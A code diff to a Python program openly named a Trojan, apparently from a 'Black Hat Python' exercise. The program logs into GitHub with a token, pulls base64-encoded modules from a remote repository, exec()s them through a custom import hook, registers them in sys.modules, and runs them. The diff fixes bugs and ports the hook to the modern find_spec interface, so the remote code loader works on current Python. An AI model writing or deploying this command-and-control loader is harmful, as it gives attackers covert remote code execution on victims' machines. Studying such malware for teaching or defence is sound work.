@@ -15,7 +15,7 @@ def connect_to_github():
     with open('mytoken.txt') as f:
         token = f.read().strip()
         user = 'jordan-schoon' 
-        sess = github3.login(token=token)
+        sess = github3.login(token= token)
         return sess.repository(user, 'bhptrojan')
     
 def get_file_contents(dirname, module_name, repo):
@@ -37,7 +37,7 @@ class Trojan:
         return config
     
     def module_runner(self, module):
-        result = sys.module[module].run()
+        result = sys.modules[module].run()
         self.store_module_result(result)
     
     def store_module_result(self, data):
@@ -59,18 +59,32 @@ class GitImporter:
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self, name, path=None):
+    def find_spec(self, name, path=None, *args, **kwargs):
         print("[*] Attempting to find module: %s" % name)
         self.repo = connect_to_github()
-        new_library = get_file_contents("modules", f'{name}.py', self.repo)
-        if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
+        try:
+            new_library = get_file_contents("modules", f'{name}.py', self.repo)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                # We hand 'None' as the loader, but pass our own origin string.
+                # Then we let Python know this class will handle the loading logic directly.
+                spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
+                spec.loader = self
+                return spec
+        except Exception as e:
+            # If the module isn't in our GitHub repo, let Python keep looking elsewhere
+            return None
+        return None
     
     def load_module(self, name):
+        # Create a blank module structure
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
+        
+        # Inject our dynamically pulled github code into its namespace
         exec(self.current_module_code, new_module.__dict__)
+        
+        # Register it globally inside Python's system modules list
         sys.modules[spec.name] = new_module
         return new_module
     
